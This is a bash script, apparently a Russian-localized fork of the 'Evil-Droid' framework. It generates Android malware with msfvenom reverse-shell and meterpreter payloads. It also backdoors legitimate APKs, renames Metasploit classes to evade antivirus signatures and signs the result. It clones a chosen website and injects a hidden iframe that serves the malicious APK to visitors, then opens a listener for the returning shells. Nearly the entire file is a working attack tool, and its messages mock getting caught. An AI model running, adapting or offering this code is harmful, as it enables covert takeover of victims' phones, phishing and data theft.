#!/usr/bin/env bash
#
# Evil-Droid Framework . version 0.2
# Evil-Droid is a framework that create & generate & embed apk payload to penetrate android platform
# 
#                  Created By Mascerano Bachir .
#                       DarkNet shadow net        
#
#
# this is an open source tool if you want to modify or add something . Please give me a copy.

# resize terminal window
resize -s 38 70 > /dev/null
#Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";
# Check root
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "Для коректной работы программы Вы должны быть суперпользователем [ROOT] "; echo ; exit 1; }
clear
# check internet 
function checkinternet() 
{
  ping -c 1 google.com > /dev/null 2>&1
  if [[ "$?" != 0 ]]
  then
    echo -e $yellow " Проверка интернет соединения: ${RedF}FAILED"
    echo
    echo -e $red "Этой программе нужно активное интернет соединения!!!"
    echo
    echo -e $yellow " Evil-Droid Выход"
    echo && sleep 2
    exit
  else
    echo -e $yellow " Проверка интернет соединения: ${LighGreenF}[+]Подключенно"
  fi
}
checkinternet
sleep 2
#Define options
path=`pwd`
lanip=`ip route get 1 | awk '{print $NF;exit}'`
publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
ver="v0.2"
VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
echo ""
sleep 1
# spinner for Metasploit Generator
spinlong ()
{
    bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}
# detect ctrl+c exiting
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
echo -e $red"[*] Stopping Services... "
apache_svc_stop
postgresql_stop
sleep 1
echo ""
echo -e $yellow"[*] Спасибо за использование Evil-Droid  :)"
exit
}
#detect system
echo -e $blue
sudo cat /etc/issue.net
#check dependencies existence
echo -e $blue "" 
echo "® Проверяем зависимости ®" 
echo "                                       " 
# check if metasploit-framework is installed
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ найден ]"
which msfconsole > /dev/null 2>&1
sleep 2
else
echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}not найден "
echo -e $yellow "[ ! ] Установка Metasploit-Framework "
sudo apt-get install metasploit-framework -y
echo -e $blue "[ ✔ ] Установка выполнена ...."
which msfconsole > /dev/null 2>&1
sleep 2
fi
#check if xterm is installed
which xterm > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Xterm.............................${LighGreenF}[ найден ]"
which xterm > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] xterm -> ${RedF}not найден! "
sleep 2
echo -e $yellow "[ ! ] Установка Xterm "
sleep 2
echo -e $green ""
sudo apt-get install xterm -y
clear
echo -e $blue "[ ✔ ] Установка выполнена .... "
which xterm > /dev/null 2>&1
fi
#check if zenity is installed
which zenity > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Zenity............................${LighGreenF}[ найден ]"
which zenity > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Zenity -> ${RedF}not найден! "
sleep 2
echo -e $yellow "[ ! ] Установка Zenity "
sleep 2
echo -e $green ""
sudo apt-get install zenity -y
clear
echo -e $blue "[ ✔ ] Установка выполнена.... "
which zenity > /dev/null 2>&1
fi
#Check for Android Asset Packaging Tool
which aapt > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Aapt..............................${LighGreenF}[ найден ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Aapt -> ${RedF}not найден! "
sleep 2
echo -e $yellow "[ ! ] Установка Aapt "
sleep 2
echo -e $green ""
sudo apt-get install aapt -y
sudo apt-get install android-framework-res -y
clear
echo -e $blue "[ ✔ ] Установка выполнена .... "
which aapt > /dev/null 2>&1
fi
#Check for Apktool Reverse Engineering
which apktool > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Apktool...........................${LighGreenF}[ найден ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Apktool -> ${RedF}not найден! "
sleep 2
echo -e $yellow "[ ! ] Установка Apktool "
sleep 2
echo -e $green ""
sudo apt-get install apktool -y
clear
echo -e $blue "[ ✔ ] Установка выполнена .... "
which apktool > /dev/null 2>&1
fi
#check for zipalign
which zipalign > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Zipalign..........................${LighGreenF}[ найден ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Zipalign -> ${RedF}not найден! "
sleep 2
echo -e $yellow "[ ! ] Установка Zipalign "
sleep 2
echo -e $green ""
sudo apt-get install zipalign -y
clear
echo -e $blue "[ ✔ ] Установка выполнена .... "
which zipalign > /dev/null 2>&1
fi
directory="$path/evilapk"
if [ ! -d "$directory" ]; then
	echo "Creating the output directory..."
	mkdir $directory
        sleep 3
fi
echo -e $red "╔──────────────────────────────────────────────────────────╗"
echo -e $red "|         Evil-Droid Framework                             |"
echo -e $red "|   ШКОЛОЛО не загружайте APK файл на VirusTotal.com       |"
echo -e $red "┖──────────────────────────────────────────────────────────┙"
#function ascii banner
function print_ascii_art {
echo -e $lightgreen "             .           .           "          
echo -e $lightgreen "             M.          .M          "     
echo -e $lightgreen "              MMMMMMMMMMM.           "     
echo -e $lightgreen "           .MMM\MMMMMMM/MMM.         "     
echo -e $lightgreen "          .MMM.7MMMMMMM.7MMM.        "     
echo -e $lightgreen "         .MMMMMMMMMMMMMMMMMMM        "     
echo -e $lightgreen "         MMMMMMM.......MMMMMMM       "     
echo -e $lightgreen "         MMMMMMMMMMMMMMMMMMMMM       "     
echo -e $lightgreen "    MMMM MMMMMMMMMMMMMMMMMMMMM MMMM  "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "    MMM8 MMMMMMMMMMMMMMMMMMMMM 8MMM  "   
echo -e $lightgreen "         MMMMMMMMMMMMMMMMMMMMM       "   
echo -e $lightgreen "         MMMMMMMMMMMMMMMMMMMMM       "   
echo -e $lightgreen "             MMMMM   MMMMM  $ver     "   
echo -e $lightgreen "             MMMMM   MMMMM           "   
echo -e $lightgreen "             MMMMM   MMMMM           "   
echo -e $lightgreen "             MMMMM   MMMMM           "   
echo -e $lightgreen "             .MMM.   .MMM.           " 
echo -e $lightgreen "     DARK_ENERGY Team darknet forum  "                                 
}
#function lhost
function get_lhost() 
{
  LHOST=$(zenity --title="☢ SET LHOST ☢" --text "Ваш-Локальный_ip_адресс: $lanip ; Ваш_Публичный_ip_адресс: $publicip" --entry-text "$lanip" --entry --width 300 2> /dev/null)
}
#function lport
function get_lport() 
{
  LPORT=$(zenity --title="☢ SET LPORT ☢" --text "Укажите лоакльный порт для бекконетка (например) : 31337" --entry-text "31337" --entry --width 300 2> /dev/null)
}
#function payload
function get_payload()
{
  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nВыберите полезную нагрузку (payload):" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
}
function get_payload1()
{
  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nВыберите полезную нагрузку (payload):" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 400 --height 400 2> /dev/null)
}
#function name
function payload_name()
{
 apk_name=$(zenity --title "☢ PAYLOAD NAME ☢" --text "имя вредоносного APK файла : DarkAPK" --entry --entry-text "dark_apk" --width 300 2> /dev/null)
}
#function original apk
function orig_apk()
{
 orig=$(zenity --title "☢ ORIGINAL APK ☢" --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null) 
}
#function generate payload
function gen_payload()
{
 echo -e $yellow ""
 echo "[*] Генерируем apk файл (GENERATE apk payload)"
 spinlong
 xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
}
function embed_payload()
{
 echo -e $yellow ""
 echo "[*] Внедрения APK файла в оригинальное приложения для ANDROID"
 spinlong
 xterm -T " EMBED APK PAYLOAD" -e msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
}
#function apktool
function apk_decomp()
{
 echo -e $yellow ""
 echo "[*] Декомпиляция APK файла..."
 spinlong
 xterm -T "Decompiling APK" -e apktool d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1
 rm $apk_name.apk
}
function apk_comp()
{
 echo -e $yellow ""
 echo "[*] Пересборка APK файла ..."
 spinlong
 xterm -T "Rebuilding APK" -e apktool b $path/payload > /dev/null 2>&1
 mv payload/dist/$apk_name.apk $path > /dev/null 2>&1
 rm -r payload > /dev/null 2>&1
}
#function errors
function error()
{
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "【X】 Не удалось пересобрать APK файл【X】"
   echo
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
}
function error0()
{
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "【X】 УПС... Что то пошло не так... Попробуйте перезапустить программу【X】"
   echo
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
}
#function apache2 service
function apache_svc_start()
{
 service apache2 start | zenity --progress --pulsate --title "Подождите пожалуйтса..." --text="Запуск веб сервера..." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}
function apache_svc_stop()
{
 service apache2 stop | zenity --progress --pulsate --title "Подождите пожалуйтса..." --text="Остановка веб сервера..." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}
#function postgresql service
function postgresql_start()
{
 service postgresql start | zenity --progress --pulsate --title "Подождите пожалуйтса..." --text="Запуск службы PostgreSQL (служба Базы Даных)" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}
function postgresql_stop()
{
 service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Остановка службы PostgreSQL (служба Базы Даных)" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}
#function flagged by av & updating smalies
function flagg()
{
 echo -e $yellow ""
 echo "[*] Очистка  контента полезной нагрузки  для обхода  сигнатур АнтиВируса..."
 spinlong
 mv payload/smali/com/metasploit payload/smali/com/$VAR1
 mv payload/smali/com/$VAR1/stage payload/smali/com/$VAR1/$VAR2
 mv payload/smali/com/$VAR1/$VAR2/Payload.smali payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 sleep 2
 if [ -f payload/smali/com/$VAR1/$VAR2/PayloadTrustManager.smali ]; then
    echo
    echo -e $red "[ X ] Упс... Ошибка...  Попробуйте обновить свой дистрибутив Linux ( Kali Linux лучше подойдет для комфортной работы ) .."
    apache_svc_stop
    postgresql_stop
    exit 1
 fi
 sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" payload/smali/com/$VAR1/$VAR2/*
 sed -i "s#Payload#$VAR3#g" payload/smali/com/$VAR1/$VAR2/*
 sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 sed -i "s#payload#$VAR7#g" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" payload/AndroidManifest.xml
 sed -i "s#metasploit#$VAR8#" payload/AndroidManifest.xml
 sed -i "s#MainActivity#$apk_name#" payload/res/values/strings.xml
 sed -i '/.SET_WALLPAPER/d' payload/AndroidManifest.xml
 sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' payload/AndroidManifest.xml
}
#function signing apk
function sign()
{
 echo -e $yellow ""
 echo "[*] Проверяем подпись сертификатов в ~/.android/debug.keystore for signing..."
 spinlong
 if [ ! -f ~/.android/debug.keystore ]; then
     echo -e $red ""
     echo " [ X ] Отладочный ключ не был найден. Создание нового ключа ..."
     spinlong
     if [ ! -d "~/.android" ]; then
       mkdir ~/.android > /dev/null 2>&1
     fi
     echo -e $lightgreen ""
     keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 
 fi
 spinlong
 echo -e $yellow ""
 echo "[*] Попытка подписи приложения вашим отладочным ключем для Android"
 spinlong
 jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $apk_name.apk androiddebugkey > /dev/null 2>&1
 echo -e $yellow 
 echo "[*] Проверка подписи артифактов ..."
 spinlong
 jarsigner -verify -certs $apk_name.apk > /dev/null 2>&1
 rc=$?
 echo -e $yellow
 echo "[✔] Выполнено."
 spinlong
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "[!] Ошибка проверки артифактов"
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
}
#function ask
function quests()
{
while true; do
   echo ""
   quest=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Создать новый APK файл или попытаться инжектировать оригинальное приложения ?" --radiolist --column "Choose" --column "Option" TRUE "APK-MSF" FALSE "ORIGINAL-APK" --width 305 --height 270 2> /dev/null) 
   case $quest in
   APK-MSF) spinlong;gen_payload;spinlong;apk_decomp;flagg;spinlong;apk_comp;spinlong;sign;return;;
   ORIGINAL-APK) orig_apk;spinlong;embed_payload;return;;
   esac
done
}
#function listeners
function listener()
{
  xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
}
#function clone site
function clns()
{
 clone=$(zenity --title "☢ CLONE WEBSITE ☢" --text "Укажите URL адрес сайта для клонирования : " --entry --width 400 2> /dev/null)
}
function index_name()
{
 index=$(zenity --title "☢ INDEX NAME ☢" --text "укажите имя HTML документа например : DarkNode.html" --entry --entry-text "DarkNode" --width 300 2> /dev/null)
 echo -e $yellow ""
 echo "[*] Клонирования веб сайта из URL..."
 spinlong
 wget $clone --no-check-certificate -O $index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0" > /dev/null 2>&1
}
function launcher()
{
 echo '<iframe id="frame" src="evil.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe><script type="text/javascript">setTimeout(function(){window.location.href="http://local-ip";}, 15000);</script></body></html>' | sed "s|evil.apk|$apk_name.apk|" | sed "s|local-ip|$LHOST/$index.html|" >> apk_index
 com=`cat apk_index`
 rep="</body></html>"
 sed "s|$rep|$com|" $index.html > index2.html
 mv index2.html /var/www/html/$index.html > /dev/null 2>&1
 cp $path/evilapk/$apk_name.apk /var/www/html > /dev/null 2>&1
 rm apk_index > /dev/null 2>&1
 rm $index.html > /dev/null 2>&1
 zenity --title "☢ SITE CLONED ☢" --info --text "http://$LHOST/$index.html" --width 400 > /dev/null 2>&1
}
#function attack verctor
function atkv()
{
while true; do
   echo ""
   atk_v=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Выберите одну из опций ниже:" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Attack-Vector" FALSE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
   case $atk_v in
   Multi-Handler) listener;suite;;
   Attack-Vector) clns;spinlong;index_name;launcher;listener;suite;;
   Main-Menu) clear;main;;
   Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Всего доброго братан! Не попадайся !!";echo "";exit;;
   esac
done
}
#function suite
function suite()
{
while true; do
   echo ""
   suit=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Желаете продолжить работу ?" --radiolist --column "Choose" --column "Option" TRUE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
   case $suit in
   Main-Menu) clear;main;;
   Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Всего доброго братан! Не попадайся !!";echo "";exit;;
   esac
done
}
#function clean files
function clean()
{
 rm $directory/* > /dev/null 2>&1
 rm $path/*.jpeg > /dev/null 2>&1
 rm $path/*.txt > /dev/null 2>&1
 rm /var/www/html/*.apk > /dev/null 2>&1
 rm /var/www/html/$index.html > /dev/null 2>&1
}      
start=$(zenity --question --title="☢ Evil-Droid Framework ☢" --text "Запустить фреймворк?" --width 270 2> /dev/null)
  if [ "$?" -eq "0" ]; then
    apache_svc_start
    postgresql_start
  else
    clear
    echo ""
    echo -e $lightgreen "╔───────────────────────────────────────────────────────────────────╗"
    echo -e $lightgreen "|                     Автор : Mascerano Bachir                      |"
    echo -e $lightgreen "|                Изменен: Dark_Energy Team DARKNET                  |"
    echo -e $lightgreen "|               Evil-Droid Framework by DARK_ENERGY                 |"
    echo -e $lightgreen "|                                                                   |"
    echo -e $lightgreen "|                          HACK BY PLANET                           |"
    echo -e $lightgreen "┖───────────────────────────────────────────────────────────────────┙"
    echo ""
    apache_svc_stop
    postgresql_stop
    exit
  fi
clear
#main menu
function main()
{
    while :
    do

        print_ascii_art
        echo -e $green ""
        echo "╔──────────────────────────────────────────────╗"
        echo "|          Evil-Droid Framework $ver           |"
        echo "|      Взлом удаленного ведройд устройства     |"
        echo "┖──────────────────────────────────────────────┙"
        echo "[1] APK MSF(Метасплоит)                         "
        echo "[2] Внедрения в оригинальное приложения         "
        echo "[3] Обход антивируса (APK AV  ByPASS)           "
        echo "[4] Запустить Метасплоит                        "
        echo "[c] Очистка (Удаление созданных файлов)         "
        echo "[q] Выход                                       "
        read -p "[?] Select>: " option
        echo
        
        case "$option" in 
            1)  echo -e $lightgreen "[✔] APK MSF"
                echo -e $green
                get_lhost
                get_lport
                echo
                payload_name
                get_payload
                echo
                spinlong
                gen_payload
                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
                error0
                sleep 2
                echo ""
                zenity --title "☢ EVIL-DROID ☢" --info --text "APK PAYLOAD : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                atkv
                echo
                ;;
            2)  echo -e $lightgreen "[✔] BACKDOOR APK ORIGINAL"
                echo -e $green
                get_lhost
                get_lport
                echo
                payload_name
                get_payload
                echo
                orig_apk
                echo
                spinlong
                embed_payload
                echo 
                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
                error
                sleep 2
                echo ""
                zenity --title "☢ EVIL-DROID ☢" --info --text "BACKDOORED APK : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                atkv 
                echo
                ;;
            3)  echo -e $lightgreen "[✔] BYPASS AV APK"
                echo -e $green
                get_lhost
                get_lport
                echo
                payload_name
                get_payload1
                echo
                quests
                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
                error
                sleep 2
                echo 
                zenity --title "☢ EVIL-DROID ☢" --info --text "APK SIGNED : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                atkv 
                echo
                ;;
            4)  echo -e $lightgreen "[✔] START LISTENER"
                echo -e $green
                get_lhost
                get_lport
                echo
                get_payload
                echo
                listener
                suite 
                echo
                ;;
            c)  echo -e $lightgreen "[✔] clean up all files"
                echo
                clean
                echo
                zenity --title "☢ EVIL-DROID ☢" --info --text "All Files Are Removed " --width 400 > /dev/null 2>&1
                echo
                clear
                ;;
            q)  echo -e $yellow " Good Bye !!"
                apache_svc_stop
                postgresql_stop
                echo
                exit 0 
                ;;
            *)  echo -e $red  "【X】 Invalid option, please write a valid number【X】"
                echo
                sleep 2
                ;;
        esac
    done
}
main
